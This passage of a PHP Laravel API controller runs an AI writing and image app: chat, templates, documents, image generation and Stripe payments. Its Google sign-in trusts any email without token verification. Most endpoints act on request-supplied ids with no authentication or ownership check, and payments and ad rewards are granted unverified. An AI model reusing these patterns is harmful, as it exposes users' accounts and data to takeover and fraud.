<?php

namespace App\Http\Controllers\Api;

use Carbon\Carbon;
use App\Models\Blog;
use App\Models\Plan;
use App\Models\User;
use App\Models\AIImage;
use App\Models\Inquiry;
use App\Models\Invoice;
use App\Models\Setting;
use App\Models\UserChat;
use App\Models\Documents;
use App\Models\Templates;
use App\Models\AdsSetting;
use App\Models\Transaction;
use Illuminate\Support\Str;
use App\Models\BlogCategory;
use App\Models\OtherSetting;
use Illuminate\Http\Request;
use App\Models\SupportTicket;
use App\Models\PaymentSetting;
use App\Models\SupportMessage;
use App\Mail\SupportTicketMail;
use App\Models\AppUpdateSetting;
use App\Models\FavoriteTemplate;
use App\Models\UserDeleteRequest;
use Illuminate\Support\Facades\DB;
use App\Http\Controllers\Controller;
use App\Mail\ReplySupportTicketMail;
use Illuminate\Support\Facades\Mail;
use GuzzleHttp\Exception\ClientException;
use GuzzleHttp\Exception\ServerException;
use Illuminate\Support\Facades\Validator;

class HomeApi extends Controller
{
    public function google_registration(Request $request)
    {
        $exist = User::where('email', $request->get('email'))->first();
        if($exist != null)
        {
            $check_user = User::where('email', $request->get('email'))->where('is_deleted',0)->first();
            if($check_user != null)
            {
                $user_data = User::where('email', $request->get('email'))->where('status',1)->first();
                if($user_data != null)
                {
                    $user = User::where('email', $request->get('email'))->first();
    
                    $data = array(
                        'userId' => $user->id, 
                        'userName' => $user->name,
                        'emailId' => $user->email, 
                        'available_word' => $user->words_left,
                        'available_image' => $user->image_left,
                        'current_plan' => ($user->subscription_id)?$user->plan->plan_name:"Trial Plan",
                        'profileImage' => ($user->image)?((substr($user->image, 0, 4)=="http")?$user->image:asset('uploads/'.$user->image)):"",
                    );
                }
                else
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "User Account is Inactive!",
                    ], 404);
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "User Account is Deleted!",
                ], 404);
            }
        }
        else
        {
            $id = User::create([
                'name' => $request->get('name'),
                'email' => $request->get('email'),
                'password' => null,
                'image' => $request->get('image'),
                'email_verified_at' => date('Y-m-d H:i:s'),
                'words_left' => Setting::getSetting('register_user_default_word'),
                'image_left' => Setting::getSetting('register_user_default_image'),
                'user_type' => "User",
            ])->id;

            $user = User::find($id);

            $data = array(
                'userId' => $user->id, 
                'userName' => $user->name,
                'emailId' => $user->email, 
                'available_word' => $user->words_left,
                'available_image' => $user->image_left,
                'current_plan' => ($user->subscription_id)?$user->plan->plan_name:"Trial Plan",
                'profileImage' => ($user->image)?((substr($user->image, 0, 4)=="http")?$user->image:asset('uploads/'.$user->image)):"",
            );
        }

        return $data;
    }

    public function user_data(Request $request)
    {
        $user = User::find($request->id);

        if (!empty($user))
        {
            $favorite_templates  = FavoriteTemplate::where('user_id',$user->id)->orderBy('id','desc')->get();

            $favorite_templates_data = [];
        
            foreach ($favorite_templates as $f) {
                $favorite_templates_data[] = array(
                    "templateId" => $f->template->id,
                    "templateName" => $f->template->title,
                    "templateImage" => ($f->template->image)?asset('assets/images/social/'.$f->template->image):"",
                    "templateDescription" => $f->template->description,
                    "category" => $f->template->type,
                    "favorite" => "true"
                );
            }

            $documents = Documents::where('user_id',$user->id)->whereMonth('created_at', Carbon::now()->month)->get();
            $documents_created = $documents->count();
            $count = 0;
            foreach($documents as $total)
            {
                $count = $count + $total->document_word;
            }
            $documents_word = $count;
            $templates_used = $documents->groupby('templates_id')->count();

            $image = AIImage::where('user_id',$user->id)->whereMonth('created_at', Carbon::now()->month)->get();
            $images_created = $image->count();

            $user_monthly_word = Documents::select(DB::raw("sum(document_word) as data"), DB::raw("DAY(created_at) day"))
                ->whereMonth('created_at', Carbon::now()->month)
                ->where('user_id', $user->id)
                ->groupBy('day')
                ->orderBy('day')
                ->get()->toArray(); 
                
            $user_monthly_image = AIImage::select(DB::raw("COUNT(*) as data"), DB::raw("DAY(created_at) day"))
                    ->whereMonth('created_at', Carbon::now()->month)
                    ->where('user_id', $user->id)
                    ->groupBy('day')
                    ->orderBy('day')
                    ->get()->toArray();

            $data = [];
            $final_data = [];

            for($i = 1; $i <= 31; $i++) {
                $data[$i] = 0;
            }
    
            foreach ($user_monthly_word as $row) {				            
                $month = $row['day'];
                $data[$month] = intval($row['data']);
            }

            foreach ($data as $val) {
                $final_data[] = $val;
            }

            $data_image = [];
            $final_data_image = [];

            for($j = 1; $j <= 31; $j++) {
                $data_image[$j] = 0;
            }
    
            foreach ($user_monthly_image as $img) {				            
                $day = $img['day'];
                $data_image[$day] = intval($img['data']);
            }

            foreach ($data_image as $val_data) {
                $final_data_image[] = $val_data;
            }

            $user_monthly_usage_word = $final_data;
            $user_monthly_usage_image = $final_data_image;

            $res = array(
                'userId' => $user->id,  
                'userName' => $user->name,
                'emailId' => $user->email, 
                'available_word' => $user->words_left,
                'available_image' => $user->image_left,
                'isSubscribe' => ($user->subscription_end_date >= date("Y-m-d",strtotime('today')))?true:false,
                'start_date' => $user->subscription_start_date,
                'end_date' => $user->subscription_end_date,
                'current_plan' => ($user->subscription_id)?$user->plan->plan_name:"Trial Plan",
                'profileImage' => ($user->image)?((substr($user->image, 0, 4)=="http")?$user->image:asset('uploads/'.$user->image)):"",
                'document_created' => $documents_created,
                'word_used' => $documents_word,
                'image_created' => $images_created,
                'template_used' => $templates_used,
                'favorite_template' => $favorite_templates_data,
                'user_monthly_usage_word' => $user_monthly_usage_word,
                'user_monthly_usage_image' => $user_monthly_usage_image,
            );

            return response()->json($res);
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function rewarded_add(Request $request)
    {
        $user = User::find($request->user_id);
        if (!empty($user))
        {
            $user = User::find($request->user_id);
            $user->words_left = $user->words_left + AdsSetting::getAdsSetting('rewarded_word');
            $user->image_left = $user->image_left + AdsSetting::getAdsSetting('rewarded_image');
            $user->save();

            return response()->json([
                'status' => "Success",
                'message' => "Rewarded Add Success!",
            ], 200);
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function user_chat(Request $request)
    {
        $user = User::find($request->user_id);
        if(!empty($user))
        {
            if($request->text != "")
            {
                try{
                    $moderations_body = [
                        'input' => $request->text,
                    ];
            
                    $headers = [
                        "Authorization" => "Bearer ".Setting::getSetting('openai_key'),
                        'Content-Type'  => 'application/json',
                    ];
            
                    $moderations_client = new \GuzzleHttp\Client();
                    $moderations_url = "https://api.openai.com/v1/moderations";
                    $moderations_response = $moderations_client->request('POST', $moderations_url, [
                                'headers' => $headers,
                                'body' => json_encode($moderations_body),
                            ]);
            
                            
                    $moderations_json = json_decode($moderations_response->getBody(), true);
            
                    if($moderations_json['results'][0]['flagged'])
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "The Input contains in-appropriate content.",
                        ], 404);
                    }
                    else
                    {
                        $headers = [
                            "Authorization" => "Bearer ".Setting::getSetting('openai_key'),
                            'Content-Type'  => 'application/json',
                        ];
                
                        // $body = [
                        //     'model' => Setting::getSetting('openai_model'),
                        //     'prompt' => $request->text,
                        //     'temperature' => 0,
                        //     'max_tokens' => 4000,
                        // ];

                        $chat_record = UserChat::where("user_id",$request->user_id)->where("chat_id",$request->chat_id)->latest()->take(2)->get();
                        $prompt = [];
                        if(!$chat_record->isEmpty())
                        {
                            foreach($chat_record as $key=>$record)
                            {
                                $prompt[$key]["role"] = $record->role;
                                $prompt[$key]["content"] = $record->text;
                            }
    
                            $prompt[2]["role"] = "user";
                            $prompt[2]["content"] = $request->text;
                        }
                        else
                        {
                            $prompt[0]["role"] = "user";
                            $prompt[0]["content"] = $request->text;
                        }

                        if(Setting::getSetting('openai_model') == "gpt-3.5-turbo" || Setting::getSetting('openai_model') == "gpt-4" || Setting::getSetting('openai_model') == "gpt-4-0314" || Setting::getSetting('openai_model') == "gpt-4-32k" || Setting::getSetting('openai_model') == "gpt-4-32k-0314" || Setting::getSetting('openai_model') == "gpt-3.5-turbo-0301")
                        {
                            $body = [
                                'model' => Setting::getSetting('openai_model'),
                                "messages" => $prompt,
                                "temperature" => 0.7,
                                "max_tokens" => 3000,
                            ];
                        }
                        else
                        {
                            $body = [
                                'model' => "gpt-3.5-turbo",
                                "messages" => $prompt,
                                "temperature" => 0.7,
                                "max_tokens" => 3000,
                            ];
                        }
            
                        $client = new \GuzzleHttp\Client();
                        $url = "https://api.openai.com/v1/chat/completions";
                        $response = $client->request('POST', $url, [
                                    'headers' => $headers,
                                    'body' => json_encode($body),
                                ]);
            
                        $json = json_decode($response->getBody(), true);
                        $user = User::find($request->user_id);
            
                        if($user->words_left >= $this->my_word_count($json["choices"][0]["message"]["content"]))
                        {
                            UserChat::create([
                                "text" => $request->text,
                                "user_id" => $request->user_id,
                                "role" => "user",
                                "chat_id" => $request->chat_id,
                            ]);
    
                            UserChat::create([
                                "text" => nl2br($json["choices"][0]["message"]["content"]),
                                "user_id" => $request->user_id,
                                "role" => "assistant",
                                "chat_id" => $request->chat_id,
                            ]);
                            
                            $user = User::find($request->user_id);
                            $user->words_left = $user->words_left - $this->my_word_count($json["choices"][0]["message"]["content"]);
                            $user->save();
            
                            $chat = UserChat::where("user_id",$request->user_id)->where("chat_id",$request->chat_id)->get();

                            foreach ($chat as $c) {
                                $data[] = array(
                                    "userId" => $c->user_id,
                                    "chatId" => $c->chat_id,
                                    "role" => $c->role,
                                    "text" => $c->text,
                                );
                            }
    
                            return $data;
                        }
                        else
                        {
                            return response()->json([
                                'status' => "Error",
                                'message' => "Your Account Insufficient Words Available!",
                            ], 404);
                        }
                    
                    }
                } 
                catch (ClientException $e) 
                {
                    if($e->getcode() == 400) 
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Your request was rejected as a result of our safety system.",
                        ], 404);
                    }
                    if($e->getcode() == 401)
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Incorrect API key provided and Invalid Authentication",
                        ], 404);
                    }
                    if($e->getcode() == 429)
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "The engine is currently overloaded, please try again later",
                        ], 404);
                    }
                    if($e->getcode() == 500)
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Retry your request after a brief wait and contact us if the issue persists.",
                        ], 404);
                    }
                }
                catch (ServerException $s) 
                {
                    if($s->getcode() == 500)
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "The server had an error while processing your request.",
                        ], 404);
                    }
                }
            }
            else
            {
                $chat = UserChat::where("user_id",$request->user_id)->where("chat_id",$request->chat_id)->get();
                $data = [];

                foreach ($chat as $c) {
                    $data[] = array(
                        "userId" => $c->user_id,
                        "chatId" => $c->chat_id,
                        "role" => $c->role,
                        "text" => $c->text,
                    );
                }

                return $data;
            }
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function chat_history(Request $request)
    {
        $user = User::find($request->user_id);
        if(!empty($user))
        {
            $chat = UserChat::select('chat_id')->where("user_id",$request->user_id)->get();
            
            $id = [];

            foreach ($chat as $c) {
                if(!in_array($c->chat_id, $id))
                {
                    $id[]=  $c->chat_id;
                }
            }

            $all_record = [];
            foreach ($id as $val) {
                $record = UserChat::where("chat_id",$val)->where("user_id",$request->user_id)->get();
                $data = [];
                foreach ($record as $r) {
                    $data[] = array(
                        "userId" => $r->user_id,
                        "chatId" => $r->chat_id,
                        "role" => $r->role,
                        "text" => $r->text,
                    );
                }

                $all_record[] = array(
                    "chatId" => $val,
                    "data" => $data
                );
            }


            return $all_record;
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function template(Request $request)
    {
        $user = User::find($request->user_id);

        if (!empty($user))
        {
            $category_data = [];
            $category_data[0] = "Social";
            $category_data[1] = "Copywriting";
            $category_data[2] = "Ads & Marketing";
            $category_data[3] = "Ecommerce";
            $category_data[4] = "Article & Blog";
            $category_data[5] = "General Writing";
            $category_data[6] = "ASO";
            $category_data[7] = "Email";

            $social  = Templates::where('type',"Social")->where('status',1)->get();
            $copywriting  = Templates::where('type',"Copywriting")->where('status',1)->get();
            $marketing  = Templates::where('type',"Ads & Marketing")->where('status',1)->get();
            $ecommerce  = Templates::where('type',"Ecommerce")->where('status',1)->get();
            $article  = Templates::where('type',"Article & Blog")->where('status',1)->get();
            $general  = Templates::where('type',"General Writing")->where('status',1)->get();
            $aso  = Templates::where('type',"ASO")->where('status',1)->get();
            $email  = Templates::where('type',"Email")->where('status',1)->get();

            $social_data = [];
            foreach($social as $t) {
                $favorite = FavoriteTemplate::where("user_id",$request->user_id)->where("template_id",$t->id)->first();
                $social_data[] = array(
                    "templateId" => $t->id,
                    "templateName" => $t->title,
                    "templateImage" => ($t->image)?asset('assets/images/social/'.$t->image):"",
                    "templateDescription" => $t->description,
                    "category" => $t->type,
                    "favorite" => ($favorite != null)?"true":"false",
                );
            }

            $copywriting_data = [];
            foreach($copywriting as $t) {
                $favorite = FavoriteTemplate::where("user_id",$request->user_id)->where("template_id",$t->id)->first();
                $copywriting_data[] = array(
                    "templateId" => $t->id,
                    "templateName" => $t->title,
                    "templateImage" => ($t->image)?asset('assets/images/social/'.$t->image):"",
                    "templateDescription" => $t->description,
                    "category" => $t->type,
                    "favorite" => ($favorite != null)?"true":"false",
                );
            }

            $marketing_data = [];
            foreach($marketing as $t) {
                $favorite = FavoriteTemplate::where("user_id",$request->user_id)->where("template_id",$t->id)->first();
                $marketing_data[] = array(
                    "templateId" => $t->id,
                    "templateName" => $t->title,
                    "templateImage" => ($t->image)?asset('assets/images/social/'.$t->image):"",
                    "templateDescription" => $t->description,
                    "category" => $t->type,
                    "favorite" => ($favorite != null)?"true":"false",
                );
            }

            $ecommerce_data = [];
            foreach($ecommerce as $t) {
                $favorite = FavoriteTemplate::where("user_id",$request->user_id)->where("template_id",$t->id)->first();
                $ecommerce_data[] = array(
                    "templateId" => $t->id,
                    "templateName" => $t->title,
                    "templateImage" => ($t->image)?asset('assets/images/social/'.$t->image):"",
                    "templateDescription" => $t->description,
                    "category" => $t->type,
                    "favorite" => ($favorite != null)?"true":"false",
                );
            }

            $article_data = [];
            foreach($article as $t) {
                $favorite = FavoriteTemplate::where("user_id",$request->user_id)->where("template_id",$t->id)->first();
                $article_data[] = array(
                    "templateId" => $t->id,
                    "templateName" => $t->title,
                    "templateImage" => ($t->image)?asset('assets/images/social/'.$t->image):"",
                    "templateDescription" => $t->description,
                    "category" => $t->type,
                    "favorite" => ($favorite != null)?"true":"false",
                );
            }

            $general_data = [];
            foreach($general as $t) {
                $favorite = FavoriteTemplate::where("user_id",$request->user_id)->where("template_id",$t->id)->first();
                $general_data[] = array(
                    "templateId" => $t->id,
                    "templateName" => $t->title,
                    "templateImage" => ($t->image)?asset('assets/images/social/'.$t->image):"",
                    "templateDescription" => $t->description,
                    "category" => $t->type,
                    "favorite" => ($favorite != null)?"true":"false",
                );
            }

            $aso_data = [];
            foreach($aso as $t) {
                $favorite = FavoriteTemplate::where("user_id",$request->user_id)->where("template_id",$t->id)->first();
                $aso_data[] = array(
                    "templateId" => $t->id,
                    "templateName" => $t->title,
                    "templateImage" => ($t->image)?asset('assets/images/social/'.$t->image):"",
                    "templateDescription" => $t->description,
                    "category" => $t->type,
                    "favorite" => ($favorite != null)?"true":"false",
                );
            }

            $email_data = [];
            foreach($email as $t) {
                $favorite = FavoriteTemplate::where("user_id",$request->user_id)->where("template_id",$t->id)->first();
                $email_data[] = array(
                    "templateId" => $t->id,
                    "templateName" => $t->title,
                    "templateImage" => ($t->image)?asset('assets/images/social/'.$t->image):"",
                    "templateDescription" => $t->description,
                    "category" => $t->type,
                    "favorite" => ($favorite != null)?"true":"false",
                );
            }

            $data = [];
            foreach($category_data as $cat)
            {
                if($cat == "Social")
                {
                    $data[] = array(
                        "category" => $cat,
                        "list" => $social_data
                    );
                }
                if($cat == "Copywriting")
                {
                    $data[] = array(
                        "category" => $cat,
                        "list" => $copywriting_data
                    );
                }
                if($cat == "Ads & Marketing")
                {
                    $data[] = array(
                        "category" => $cat,
                        "list" => $marketing_data
                    );
                }
                if($cat == "Ecommerce")
                {
                    $data[] = array(
                        "category" => $cat,
                        "list" => $ecommerce_data
                    );
                }
                if($cat == "Article & Blog")
                {
                    $data[] = array(
                        "category" => $cat,
                        "list" => $article_data
                    );
                }
                if($cat == "General Writing")
                {
                    $data[] = array(
                        "category" => $cat,
                        "list" => $general_data
                    );
                }
                if($cat == "ASO")
                {
                    $data[] = array(
                        "category" => $cat,
                        "list" => $aso_data
                    );
                }
                if($cat == "Email")
                {
                    $data[] = array(
                        "category" => $cat,
                        "list" => $email_data
                    );
                }
            }

            return array(
                "category" => $category_data,
                "template" => $data,
            );
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function favorite_template(Request $request)
    {
        $temp = FavoriteTemplate::where('user_id',$request->user_id)->where('template_id',$request->template_id)->get();
        
        if($temp->isEmpty())
        {
            FavoriteTemplate::create([
                "user_id" => $request->user_id,
                "template_id" => $request->template_id,
            ]);
            
            return response()->json([
                'status' => "Success",
                'message' => "Favorite Template Set!",
            ], 200);
        }
        else
        {
            FavoriteTemplate::where('user_id',$request->user_id)->where('template_id',$request->template_id)->delete();

            return response()->json([
                'status' => "Success",
                'message' => "Favorite Template Unset!",
            ], 200);
        }
    }

    public function document(Request $request)
    {
        $user = User::find($request->user_id);

        if (!empty($user))
        {
            $document  = Documents::where('user_id',$request->user_id)->orderBy('id','desc')->get();

            $document_data = [];

            foreach ($document as $d) {
                $document_data[] = array(
                    "documentId" => $d->id,
                    "documentName" => $d->name,
                    "templateName" => $d->templates->title,
                    "templateImage" => ($d->templates->image)?asset('assets/images/social/'.$d->templates->image):"",
                    "lastChangeDate" => date('Y-m-d', strtotime($d->updated_at)),
                    "content" => $d->text,
                    "content_word" => $d->document_word,
                    "content_character" => strlen($d->text),
                );
            }

            return $document_data;
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function document_detail(Request $request)
    {
        $document = Documents::find($request->document_id);

        if (!empty($document))
        {
            $docs = Documents::find($request->document_id);
            return array(
                "documentId" => $docs->id,
                "documentName" => $docs->name,
                "templateName" => $docs->templates->title,
                "templateImage" => ($docs->templates->image)?asset('assets/images/social/'.$docs->templates->image):"",
                "lastChangeDate" => date('Y-m-d', strtotime($docs->updated_at)),
                "content" => $docs->text,
                "content_word" => $docs->document_word,
                "content_character" => strlen($docs->text),
            );
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid Document Id",
            ], 404);
        }
    }

    public function update_document(Request $request)
    {
        $docs = Documents::find($request->id);

        if (!empty($docs))
        {
            $document = Documents::where('id', $request->id)->first(); 
            $document->text = $request->text;
            $document->name = ($request->title)?$request->title:$document->name;
            $document->save();

            return response()->json([
                'status' => "Success",
                'message' => "Document Update Success!",
            ], 200);
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid Document Id",
            ], 404);
        }
    }

    public function delete_document(Request $request)
    {
        $docs = Documents::find($request->id);

        if (!empty($docs))
        {
            Documents::find($request->id)->delete();

            return response()->json([
                'status' => "Success",
                'message' => "Document Deleted Success!",
            ], 200);
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid Document Id",
            ], 404);
        }
    }

    public function magik_art(Request $request)
    {
        $user = User::find($request->user_id);

        if (!empty($user))
        {
            $art  = AIImage::where('user_id',$request->user_id)->orderBy('id','desc')->get();

            $art_data = [];
            
            foreach ($art as $a) {
                $art_data[] = array(
                    "id" => $a->id,
                    "image" => ($a->image)?asset('uploads/aiImage/'.$a->image):"",
                    "query" => $a->description,
                    "resolution" => $a->resolution,
                );
            }

            return $art_data;
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function blog()
    {
        $category = BlogCategory::where('status',1)->get();
        $category_data = [];

        foreach($category as $c)
        {
            $category_data[] = array(
                "id" => $c->id,
                "name" => $c->name,
            );
        }

        $blog = Blog::where('status',1)->get();
        $blog_data = [];

        foreach($blog as $b)
        {
            $blog_data[] = array(
                "title" => $b->title,
                "description" => $b->description,
                "category" => $b->category->name,
                "image" => ($b->image)?asset('uploads/'.$b->image):"",
            );
        }

        return array(
            "category" => $category_data,
            "blog" => $blog_data,
        );
    }

    public function subscription_plan()
    {
        $plan = Plan::where('status',1)->get();
        $plan_data = [];

        if(!$plan->isEmpty())
        {
            foreach($plan as $p)
            {
                $plan_data[] = array(
                    "id" => $p->id,
                    "planName" => $p->plan_name,
                    "planPrice" => $p->plan_price,
                    "include_Words" => $p->total_words,
                    "include_images" => $p->number_of_images,
                    "rewarded_enable" => ($p->rewarded_enable == 1)?1:0,
                    "duration" => $p->duration." ".$p->duration_type,
                    "google_product_enable" => ($p->google_product_enable == 1)?1:0,
                    "google_product_id" => $p->google_product_id,
                    "most_popular" => ($p->most_popular != null)?1:0,
                );
            }
        }

        return $plan_data;
    }

    public function create_magik_art(Request $request)
    {
        $user = User::find($request->user_id);

        if(!empty($user))
        {
            try {
                $headers = [
                    "Authorization" => "Bearer ".Setting::getSetting('openai_key'),
                    'Content-Type'  => 'application/json',
                ];

                if($request->style != "")
                {
                    $prompt = $request->style." Of ".$request->description." ".$request->medium;
                }
                else
                {
                    $prompt = $request->description." ".$request->medium;
                }

                $moderations_body = [
                    'input' => $prompt,
                ];
        
                $moderations_client = new \GuzzleHttp\Client();
                $moderations_url = "https://api.openai.com/v1/moderations";
                $moderations_response = $moderations_client->request('POST', $moderations_url, [
                            'headers' => $headers,
                            'body' => json_encode($moderations_body),
                        ]);
        
                        
                $moderations_json = json_decode($moderations_response->getBody(), true);
        
                if($moderations_json['results'][0]['flagged'])
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "The Input contains in-appropriate content.",
                    ], 404);
                }
                else
                {
                    $body = [
                        'prompt' => $prompt,
                        'size' => $request->resolution,
                        'n' => (int)$request->number_of_images,
                    ];

                    $user = User::find($request->user_id);
                    if($user->image_left >= $request->number_of_images)
                    {
                        $client = new \GuzzleHttp\Client();
                        $url = "https://api.openai.com/v1/images/generations";
                        $response = $client->request('POST', $url, [
                                'headers' => $headers,
                                'body' => json_encode($body),
                            ]);

                        $json = json_decode($response->getBody(), true);

                        if(isset($json['data']))
                        {
                            $art_data = [];

                            foreach ($json['data'] as $key => $value) {
                                $url = $value['url'];

                                $image_name = Str::random(10) . '.png';

                                $image = file_get_contents($url);
                                file_put_contents('./uploads/aiImage/' . $image_name, $image);

                                $ai = new AIImage();
                                $ai->user_id = $request->user_id;
                                $ai->description = $prompt;
                                $ai->resolution = $request->resolution;
                                $ai->image = $image_name;
                                $ai->save();

                                $user = User::find($request->user_id);
                                $user->image_left = $user->image_left - 1;
                                $user->save();

                                $art_data[] = array(
                                    "id" => $ai->id,
                                    "image" => ($ai->image)?asset('uploads/aiImage/'.$ai->image):"",
                                    "query" => $ai->description,
                                    "resolution" => $ai->resolution,
                                );
                            }

                            return $art_data;
                        } 
                    }
                    else
                    {
                        return response()->json([
                            'status' => "Error",
                            'message' => "Your Account Insufficient Image Available!",
                        ], 404);
                    }
                }
            } 
            catch (ClientException $e) 
            {
                if($e->getcode() == 400) 
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Your request was rejected as a result of our safety system.",
                    ], 404);
                }
                if($e->getcode() == 401)
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Incorrect API key provided and Invalid Authentication",
                    ], 404);
                }
                if($e->getcode() == 429)
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "The engine is currently overloaded, please try again later",
                    ], 404);
                }
                if($e->getcode() == 500)
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "Retry your request after a brief wait and contact us if the issue persists.",
                    ], 404);
                }
            }
            catch (ServerException $s) 
            {
                if($s->getcode() == 500)
                {
                    return response()->json([
                        'status' => "Error",
                        'message' => "The server had an error while processing your request.",
                    ], 404);
                }
            }
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function delete_magik_art(Request $request)
    {
        $ai = AIImage::find($request->id);

        if (!empty($ai))
        {
            AIImage::find($request->id)->delete();

            return response()->json([
                'status' => "Success",
                'message' => "Magik Art Deleted Success!",
            ], 200);
        } 
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid Magik Art Id",
            ], 404);
        }
    }

    public function account_delete_request(Request $request)
    {
        $user = User::find($request->user_id);
        if (!empty($user))
        {
            UserDeleteRequest::create([
                "user_id" => $request->user_id,
            ]);

            return response()->json([
                'status' => "Success",
                'message' => "User Delete Request Send Success!",
            ], 200);
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid user Id!",
            ], 404);
        }

    }

    public function stripePayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'order_amount' => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            try {
                $stripe = new \Stripe\StripeClient(PaymentSetting::getPaymentSetting('stripe_secret_key'));

                $customer = $stripe->customers->create();

                $ephemeralKey = $stripe->ephemeralKeys->create([
                'customer' => $customer->id,
                ], [
                'stripe_version' => '2022-08-01',
                ]);

                $paymentIntent = $stripe->paymentIntents->create([
                    'amount' => $request->order_amount*100,
                    'currency' => PaymentSetting::getPaymentSetting('currency'),
                    'customer' => $customer->id,
                    'automatic_payment_methods' => [
                        'enabled' => 'true',
                    ],
                ]);

                $data = array(
                    'paymentIntent' => $paymentIntent->client_secret,
                    'ephemeralKey' => $ephemeralKey->secret,
                    'customer' => $customer->id,
                    'publishableKey' => PaymentSetting::getPaymentSetting('stripe_publishable_Key')
                );
            } catch (\Stripe\Exception\CardException $e) {
                // Since it's a decline, \Stripe\Exception\CardException will be caught
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\RateLimitException $e) {
                // Too many requests made to the API too quickly
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\InvalidRequestException $e) {
                // Invalid parameters were supplied to Stripe's API
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\AuthenticationException $e) {
                // Authentication with Stripe's API failed
                // (maybe you changed API keys recently)
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\ApiConnectionException $e) {
                // Network communication with Stripe failed
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\ApiErrorException $e) {
                // Display a very generic error to the user, and maybe send
                // yourself an email
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (Exception $e) {
                // Something else happened, completely unrelated to Stripe
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            }
            
            return response()->json($data);
        }
    }

    public function create_payment(Request $request)
    {
        $user = User::find($request->user_id);
        if (!empty($user))
        {
            $plan = Plan::find($request->plan_id);
            if (!empty($plan))
            {
                Transaction::create([
                    "user_id" => $request->user_id,
                    "subscription_id" => $request->plan_id,
                    "total_paid" => $plan->plan_price,
                    "payment_id" => $request->payment_id,
                    "payment_type" => $request->payment_type,
                    "status" => "Completed",
                    "date" => date('Y-m-d')
                ]);

                Invoice::create([
                    "payment_id" => $request->payment_id,
                    "user_id" => $request->user_id,
                    "subscription_id" => $request->plan_id,
                ]);

                $user = User::find($request->user_id);
                $user->subscription_id = $request->plan_id;
                $user->is_subscribe = 1;
                $user->words_left = $user->words_left + $plan->total_words;
                $user->image_left = $user->image_left + $plan->number_of_images;
                if($plan->rewarded_enable == 1)
                {
                    $user->subscription_start_date = date('Y-m-d');
                    $user->subscription_end_date = date('Y-m-d', strtotime($plan->duration." ".$plan->duration_type));
                }
                $user->save();

                return response()->json([
                    'status' => "Success",
                    'message' => "Transaction Success!",
                ], 200);
            }
            else 
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Plan Id",
                ], 404);
            }
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function purchase_history(Request $request)
    {
        $user = User::find($request->user_id);

        if (!empty($user))
        {
            $transaction = Transaction::where('user_id',$request->user_id)->get();

            $transaction_data = [];

            foreach ($transaction as $t) {
                $transaction_data[] = array(
                    "transactionId" => $t->id,
                    "title" => $t->plan->plan_name,
                    "amount" => $t->total_paid." USD",
                    "payment_id" => $t->payment_id,
                    "date" => date('d M, y',strtotime($t->date)),
                );
            }
    
            return $transaction_data;
        }
        else 
        {
            return response()->json([
                'status' => "Error",
                'message' => "Invalid userId",
            ], 404);
        }
    }

    public function profile_update(Request $request)
    {
        $user = User::find($request->user_id);
        if(!empty($user))
        {
            $validation = Validator::make($request->all(), [
                'name' => 'required',
                'email' => 'required|email|unique:users,email,' . \Request::get("user_id"),
                "image" => "nullable|mimes:jpg,png,jpeg",
            ]);
    
            if ($validation->fails()) {
                $errors = [];
                foreach ($validation->errors()->messages() as $key => $value) {
                    $errors[] = is_array($value) ? implode(',', $value) : $value;
                }
    
                return response()->json([
                    'status' => "Error",
                    'message' => $errors,
                ], 404);
            }
